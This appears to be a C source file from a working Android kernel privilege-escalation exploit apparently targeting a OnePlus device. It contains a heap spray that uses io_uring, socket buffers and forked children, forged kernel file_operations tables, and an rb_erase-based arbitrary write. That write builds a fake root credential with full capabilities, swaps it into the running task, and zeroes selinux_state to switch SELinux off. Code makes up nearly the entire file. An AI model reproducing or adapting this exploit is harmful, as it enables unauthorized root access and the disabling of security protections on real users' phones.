#include "common.h"
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"
#include <linux/io_uring.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
unsigned char *skb_buf; /* payload template; readback scans it (fops.c) */
static int reclaim_sv[2] = {-1, -1};
#define SKB_READBACK_MAX 32
static uint8_t g_skb_readback[SKB_READBACK_MAX][16384];
static int g_skb_readback_n;
/* Drain ALL queued DGRAM skbs into the readback buffers: the target page
 * may have been captured by ANY of the order-3 skb data objects, so every
 * queued message must be checked for walk effects. Returns the number of
 * messages received. */
int skb_reclaim_readback(void) {
  if (!g_skb_reclaim || reclaim_sv[1] < 0) return 0;
  g_skb_readback_n = 0;
  for (int i = 0; i < SKB_READBACK_MAX; i++) {
    errno = 0;
    ssize_t r = recv(reclaim_sv[1], g_skb_readback[i], 16384, MSG_DONTWAIT);
    if (r <= 0) break;
    g_skb_readback_n++;
  }
  return g_skb_readback_n;
}
uint8_t *skb_readback_buf(int i) { return g_skb_readback[i]; }
int skb_readback_count(void) { return g_skb_readback_n; }
int uring_fd = -1;
void *uring_sqes = NULL;
/* Sized by URING_MAX: the reclaim spray tracks every rings+SQE mapping so
 * the readback can scan them all (an untracked mapping could hold the
 * target page invisibly). */
int uring_fds[URING_MAX];
void *uring_maps[URING_MAX];
size_t uring_mapsz[URING_MAX];
/* payload block stride per mapping: MM_SLAB_SIZE (16KB) for rings/sqes,
 * 0x1000 for the MOVABLE-storm pseudo-mapping (0 = default 16KB). */
size_t uring_mapstride[URING_MAX];
int uring_count = 0;
long g_storm_block_start = -1;
extern uintptr_t g_init_user_ns_addr;

uint8_t *uring_block(int idx) {
  for (int m = 0; m < uring_count && m < URING_MAX; m++) {
    size_t sz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
    size_t stride = uring_mapstride[m] ? uring_mapstride[m] : MM_SLAB_SIZE;
    if (sz < stride)
      continue;
    size_t n = sz / stride;
    if ((size_t)idx < n)
      return (uint8_t *)uring_maps[m] + (size_t)idx * stride;
    idx -= (int)n;
  }
  return NULL;
}
int g_skb_reclaim = 0; /* the target page was reclaimed as skb data */
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t last_mm_struct;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

/* 2-write support */
int pselect_custom_write;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_child_node;  /* 1=write page+0x100 (preserves initialized), 0=write zero */

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      env_int_range("KSNITCH_VERBOSE", 0, 0, 1), 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)p0_phys_offset,
             (unsigned long long)p0_kernel_phys_load,
             (unsigned long long)(p0_kernel_phys_load - p0_phys_offset),
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    /* Non-fatal: the consumer's futex fallback depends on the return
     * value. pr_error would exit() the whole exploit mid-route. */
    printf("[!] sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n",
           tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

/* Physical load address of the kernel image. Chosen by the bootloader, so it
 * varies per SoC/board and is NOT derivable from the kernel image or DT.
 * Verified on OnePlus 15 (SM8850/canoe) via /proc/iomem "Kernel code" =
 * 0xc7810000 (= _stext; _text is 0x10000 lower) -> 0xc7800000, stable across
 * boots. Override at runtime with KPHYS=0x... when porting to a new board. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
uint64_t p0_phys_offset = P0_PHYS_OFFSET;

uintptr_t g_init_cred_image = INIT_CRED;

void init_p0_profile(void) {
  char *v = getenv("KPHYS");
  if (v) {
    p0_kernel_phys_load = strtoull(v, NULL, 0);
  }
  pr_info("p0 kernel_phys_load=%016llx phys_offset=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)p0_phys_offset,
          (unsigned long long)(p0_kernel_phys_load - p0_phys_offset));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - p0_phys_offset) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - p0_phys_offset);
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  put32(c, 0, 1);
  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    struct timespec child_start;
    clock_gettime(CLOCK_MONOTONIC, &child_start);
    for (;;) {
      struct timespec ts = {.tv_sec = 1, .tv_nsec = 0};
      nanosleep(&ts, NULL);
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      if (now.tv_sec - child_start.tv_sec > 120 || getppid() == 1) _exit(0);
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    /* Stay ALIVE holding the leaked mm_struct (bug #7 fix). The leaked
     * object is the only thing keeping its slab page FULL. A full SLUB
     * page is on no list and unreachable for allocations, so background
     * forks cannot consume the page during the minutes-long bruteforce.
     * exit(0) here used to empty the page early: with
     * CONFIG_SLUB_CPU_PARTIAL it then sat FROZEN on a CPU partial list
     * (put_cpu_partial) - never discarded (that needs an unfreeze
     * overflow with nr_partial >= min_partial) and freely consumable by
     * the next fork on this CPU - so the io_uring reclaim never saw it
     * and the chain walk spun at [5] on stale slab data. The page is
     * emptied and deterministically discarded by the kill phase in
     * prepare_kernel_page (leak child killed LAST). */
    pin_to_core(CORE);
    struct timespec child_start;
    clock_gettime(CLOCK_MONOTONIC, &child_start);
    for (;;) {
      struct timespec ts = {.tv_sec = 1, .tv_nsec = 0};
      nanosleep(&ts, NULL);
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      if (now.tv_sec - child_start.tv_sec > 120 || getppid() == 1) _exit(0);
    }
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  errno = 0;
  if (kill(child, SIGKILL) != 0 && errno == ESRCH) {
    /* Already dead and reaped (double-kill) - nothing to wait for. */
    return;
  }
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

static void kill_ctx_children(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->childs[i] > 0) {
      kill_child(ctx->childs[i]);
      ctx->childs[i] = 0;
    }
  }
}

void cleanup_page_prepare_state(void) {
  /* Failure paths: the holder children (and the leak child) are now kept
   * alive until the kill phase, so make sure they are reaped here too
   * (they would otherwise linger for their 120 s self-exit timeout). */
  kill_ctx_children(&prepare_ctx);
  kill_ctx_children(&spray_ctx);
  kill_ctx_children(&pre_ctx);
  kill_ctx_children(&post_ctx);
  if (child_leak > 0) {
    kill_child(child_leak);
    child_leak = 0;
  }
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  /* NOTE: every child costs ~70-100KB of page tables + mm/VMAs (its
   * dup_mm copies the page tables of the 64GB futex mapping). Too many
   * children exhaust memory and the kernel silently SIGKILLs the parent
   * mid-run (observed with 1024 prepare children). 32 slabs = 512
   * children is the proven-safe budget. */
  int prepare_slabs = env_int_range("PREPARE_SLABS", 32, 4, 64);
  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

/* Fake cred suite for mode 6 (cred swap). Fills the 5.15.170-accurate
 * struct cred plus the auxiliary objects the kernel dereferences through
 * it (security blob, user_struct, ucounts, group_info) - all on the spray
 * page. Uses a self-contained fake user_namespace on the spray page:
 * cap_capable compares ns == cred->user_ns on the first iteration and
 * matches immediately (our thread runs in the init namespace, so
 * current_user_ns() returns cred->user_ns). inc_rlimit_ucounts terminates
 * via fake_ns->ucounts = NULL after one iteration. */
uint64_t g_init_user_ns = 0;
uint32_t g_fake_sid = 1; /* initial sid guess: 1 = kernel; brute-forceable
                            * live via the SQE mmap between chain walks */
/* Real shell supplementary groups (relay-child-published pre-exploit).
 * Baked into the fake cred's group_info so the rooted thread passes
 * DAC group checks on shell-owned objects without relying on a working
 * capable(), and is visible under /proc hidepid=invisible,gid=3009. */
int g_fake_ngrps = 0;
uint32_t g_fake_grps[16];
/* the current attempt's MOVABLE-storm region (freed at the next
 * prepare_kernel_page entry: 2GB RAM cannot stack multiple storms) */
static void *g_storm_region;
static size_t g_storm_size;

static void fill_fake_cred_suite(unsigned char *p, uintptr_t payload_base) {
  uintptr_t fake_ns_addr = payload_base + FAKE_USER_NS_OFF;

  unsigned char *c = p + FAKE_CRED_OFF;
  memset(c, 0, CRED15_SIZE);
  put32(c, CRED15_USAGE_OFF, 0x40);
  put32(c, CRED15_UID_OFF, 0);
  put32(c, CRED15_GID_OFF, 0);
  put32(c, CRED15_SUID_OFF, 0);
  put32(c, CRED15_SGID_OFF, 0);
  put32(c, CRED15_EUID_OFF, 0);
  put32(c, CRED15_EGID_OFF, 0);
  put32(c, CRED15_FSUID_OFF, 0);
  put32(c, CRED15_FSGID_OFF, 0);
  put32(c, CRED15_SECUREBITS_OFF, 0);
  put64(c, CRED15_CAP_INH_OFF, CAP_FULL);
  put64(c, CRED15_CAP_PRM_OFF, CAP_FULL);
  put64(c, CRED15_CAP_EFF_OFF, CAP_FULL);
  put64(c, CRED15_CAP_BSET_OFF, CAP_FULL);
  put64(c, CRED15_CAP_AMB_OFF, CAP_FULL);
  extern uintptr_t g_leaked_security_ptr;
  if (g_leaked_security_ptr)
    put64(c, CRED15_SECURITY_OFF, g_leaked_security_ptr);
  else
    put64(c, CRED15_SECURITY_OFF, payload_base + FAKE_SEC_BLOB_OFF);
  put64(c, CRED15_USER_OFF, payload_base + FAKE_USER_STRUCT_OFF);
  /* cred->user_ns: the REAL device &init_user_ns when the device table
   * provides it (off_init_user_ns_device, set by run_cred_swap before
   * the payload build). cap_capable() walks `ns == cred->user_ns` first:
   * with the real init_user_ns every capable() call passes via CAP_FULL;
   * with ANY other value (the page-local fake ns) every capable() dies at
   * `if (ns == &init_user_ns) return -EPERM` - observed as EACCES on
   * O_CREAT in the shell-owned /data/local/tmp even with SELinux
   * permissive. Fallback: the page-local fake ns (16KB-intact captures
   * only; keeps the original mode-6 semantics). */
  put64(c, CRED15_USER_NS_OFF,
        g_init_user_ns_addr ? g_init_user_ns_addr : fake_ns_addr);
  put64(c, CRED15_UCOUNTS_OFF, payload_base + FAKE_UCOUNTS_OFF);
  put64(c, CRED15_GROUP_INFO_OFF, payload_base + FAKE_GROUP_INFO_OFF);

  unsigned char *b = p + FAKE_SEC_BLOB_OFF;
  memset(b, 0, 0x40);
  put32(b, 0, 0);
  put32(b, 4, g_fake_sid);

  unsigned char *u = p + FAKE_USER_STRUCT_OFF;
  memset(u, 0, 0x80);
  put32(u, 0, 0x1000);

  /* fake user_namespace: identity uid/gid maps, level=0, parent=NULL,
   * ucounts=NULL (terminates the inc_rlimit_ucounts loop). cap_capable
   * matches on the first iteration (ns == cred->user_ns) and never
   * dereferences parent. */
  unsigned char *ns = p + FAKE_USER_NS_OFF;
  memset(ns, 0, 0x100);
  /* uid_map @0x00: {nr_extents=1, extent[0]={first=0,lower_first=0,count=0xFFFFFFFF}} */
  put32(ns, 0x00, 1);              /* uid_map.nr_extents */
  put32(ns, 0x04, 0);              /* extent[0].first */
  put32(ns, 0x08, 0);              /* extent[0].lower_first */
  put32(ns, 0x0C, 0xFFFFFFFF);     /* extent[0].count */
  /* gid_map @0x40 */
  put32(ns, 0x40, 1);
  put32(ns, 0x44, 0);
  put32(ns, 0x48, 0);
  put32(ns, 0x4C, 0xFFFFFFFF);
  /* projid_map @0x80 */
  put32(ns, 0x80, 1);
  put32(ns, 0x84, 0);
  put32(ns, 0x88, 0);
  put32(ns, 0x8C, 0xFFFFFFFF);
  /* parent @0xC0 = NULL, level @0xC8 = 0, owner @0xCC = 0, group @0xD0 = 0 */
  /* ns.count @0xEC (inside struct ns_common) */
  put32(ns, 0xEC, 0x100);
  /* ucounts = NULL (already zero from memset) -- loop terminator */
  /* ucount_max[0..] and rlimit_max[0..] = LONG_MAX: fill generously past
   * the ucounts pointer. Offset varies by config, but filling 0xF0..0x1F0
   * with LONG_MAX covers all plausible layouts. */
  for (int i = 0xF8; i < 0x100; i += 8)
    put64(ns, i, 0x7FFFFFFFFFFFFFFFULL);

  /* fake ucounts: ns = fake_ns, count big, rlimit counters zero */
  unsigned char *uc = p + FAKE_UCOUNTS_OFF;
  memset(uc, 0, 0x100);
  put64(uc, 0x10, fake_ns_addr);   /* ns = fake_ns (on spray page) */
  put32(uc, 0x1C, 0x40000);        /* count (big, never reaches 0) */

  unsigned char *g = p + FAKE_GROUP_INFO_OFF;
  memset(g, 0, 0x20);
  put32(g, 0, 0x100);
  put32(g, 4, 0);
  if (env_flag("GHOST_GROUPS", 1)) {
    /* 5.15 group_info: { atomic_t usage; int ngroups; kgid_t blocks[]; }
     * - blocks is a flat flexible array at +8, and groups_search()
     * binary-searches it, so it MUST be sorted ascending + deduped.
     * Region budget: 0xDB0..0xE00 = 80 bytes -> at most 18 gids;
     * cap at 16 (the adb-shell set is ~15). */
    uint32_t sg[16];
    int n = g_fake_ngrps;
    if (n > 16) n = 16;
    for (int i = 0; i < n; i++) sg[i] = g_fake_grps[i];
    /* getgroups() never returns the PRIMARY gid: the shell's gid 2000
     * owns /data/local/tmp (drwxrwx--x shell:shell) and DAC there must
     * pass via the group bits -- capable(CAP_DAC_OVERRIDE) stays
     * unavailable while cred->user_ns is not the exact &init_user_ns
     * (observed: EACCES on O_CREAT despite uid=0 + full CapEff; and a
     * WRONG user_ns can even panic the kernel in cap_capable's ns
     * walk). Force 2000 into the supplementary set so in_group_p(2000)
     * matches. */
    {
      int has2000 = 0;
      for (int i = 0; i < n; i++) if (sg[i] == 2000) has2000 = 1;
      if (!has2000 && n < 16) sg[n++] = 2000;
    }
    for (int i = 1; i < n; i++) {
      uint32_t v = sg[i];
      int j = i - 1;
      while (j >= 0 && sg[j] > v) { sg[j+1] = sg[j]; j--; }
      sg[j+1] = v;
    }
    int m = 0;
    for (int i = 0; i < n; i++)
      if (m == 0 || sg[i] != sg[m-1]) sg[m++] = sg[i];
    put32(g, 4, (uint32_t)m);
    for (int i = 0; i < m; i++)
      put32(g, 8 + 4*i, sg[i]);
  }
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 3) {
          fake_right = pselect_custom_value;
        } else if (pselect_custom_write == 2) {
          /* Write 2 (cred): value = REAL init_cred (P0 address).
           * NOTE (5.15): the erase also writes pc into *(init_cred+0),
           * clobbering usage(4B)+uid(4B) - uid becomes 0xffffff80. Needs a
           * follow-up write of 0 to init_cred+4 to repair uid/gid. */
          fake_right = data_addr(g_init_cred_image);
        } else if (pselect_custom_write == 6) {
          /* Write 6: task->cred = fake cred on this page.
           * The page base is only known here, so pick the value now.
           * Walk 1 writes task->cred = fake_cred (usage+uid get pc);
           * a follow-up walk (plan) zeroes fake_cred+4 (uid/gid). */
          fake_right = payload_base + FAKE_CRED_OFF;
          pselect_custom_value = fake_right;
        } else if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
          /* Write 7 plan 0: 8-byte ZERO at selinux_state.
           * rb_erase Case 1 with child == NULL stores NULL into
           * parent->rb_right == TARGET and then sets
           * rebalance = __rb_is_black(pc) ? parent : NULL: with the
           * victim pc BLACK (bit0 = 1, see RB_BLACK in
           * rbtree_augmented.h - the |1 convention used by the cred
           * plans is BLACK!) the color walk would run and dereference
           * the fake parent's rb_left/rb_right as tree nodes. The
           * cred plans never hit this because their child != NULL
           * short-circuits rebalance to NULL regardless of color. For
           * the ZERO write the victim pc must be RED: bit0 CLEAR,
           * target-8 must stay 4-aligned (the target is 8-aligned).
           * Zeroing selinux_state[0..7] clears enforcing(+0),
           * checkreqprot(+1), initialized(+2) and policycap[0..4]:
           * avc_denied() never returns -EACCES (enforcing=0) and
           * security_compute_av() short-circuits to allowed=0xffffffff
           * when !initialized - full permissive, both gates at once.
           * The value MUST stay 0: any nonzero VALUE would be written to
           * *TARGET as a pointer (two-store Case) whose low byte is
           * nonzero - enforcing would stay set. */
          fake_right = 0;
          pselect_custom_value = 0;
        } else if (pselect_custom_write == 5 && !pselect_custom_target) {
          /* Self-test: write page+SELFTEST_VALUE into page+SELFTEST_OFF.
           * Nothing outside the spray page is touched. */
          pselect_custom_target = payload_base + SELFTEST_OFF;
          pselect_custom_value = payload_base + SELFTEST_VALUE;
          fake_right = pselect_custom_value;
        } else {
          /* Generic rb_erase write (modes 1/4/5):
           * parent = target-8, value = rb_right. */
          fake_right = pselect_custom_value;
        }
      } else {
        fake_right = 0;  /* leaf: write 0 */
      }
      fake_left = 0;
      if (pselect_custom_write == 2) {
        fake_fops = payload_base + CRED_COPY_OFF;
      }
      fake_parent = pselect_custom_target - 8;
      if (!pselect_custom_value && pselect_custom_write != 5 &&
          pselect_custom_write != WRITE_MODE_CRED_SELINUX) {
        pselect_custom_value = fake_fops;
      }
    } else {
      fake_parent = fake_fops;
      fake_right = data_addr(ASHMEM_MISC_FOPS);
      fake_left = 0;
    }
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
